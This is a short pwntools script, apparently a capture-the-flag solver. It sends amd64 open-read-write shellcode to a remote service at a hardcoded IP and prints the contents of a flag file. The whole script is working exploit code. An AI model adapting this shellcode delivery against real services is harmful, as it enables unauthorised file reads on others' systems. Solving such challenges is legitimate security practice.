#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Connect
io = remote('159.89.106.147', 1337)
io.recvuntil(b'Send shellcode (max 4096 bytes): \n')

# ORW shellcode - open, read, write
shellcode = asm('''
    /* open("flag_random_name.txt", O_RDONLY) */
    xor eax, eax
    add al, 2
    lea rdi, [rip+filename]
    xor esi, esi
    xor edx, edx
    syscall
    
    /* read(fd, rsp, 100) */
    mov edi, eax
    xor eax, eax
    mov rsi, rsp
    mov dl, 100
    syscall
    
    /* write(STDOUT, rsp, rax) */
    mov edx, eax
    xor eax, eax
    inc eax
    mov edi, eax
    mov rsi, rsp
    syscall
    
    /* exit() */
    xor eax, eax
    mov al, 60
    xor edi, edi
    syscall
    
filename:
    .ascii "flag_random_name.txt"
    .byte 0
''')

log.info(f"Shellcode size: {len(shellcode)}")
io.sendline(shellcode)

time.sleep(1)
flag = io.recvall(timeout=2)
log.success(f"Flag: {flag.decode(errors='ignore')}")

io.close()
